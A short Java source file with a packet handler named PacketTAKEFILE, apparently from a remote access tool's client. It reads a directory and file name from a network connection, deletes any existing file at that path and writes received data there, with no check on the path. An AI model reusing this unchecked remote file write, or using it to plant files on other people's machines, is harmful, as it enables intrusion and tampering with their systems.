package com.redpois0n.packets;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.common.io.FileIO;


public class PacketTAKEFILE extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();
		
		File file = new File(destdir + File.separator + filename);
		
		if (file.exists() && file.isFile()) {
			file.delete();
		}
		
		FileIO.readFile(file, Connection.dis, null, Main.getKey());
	}

}
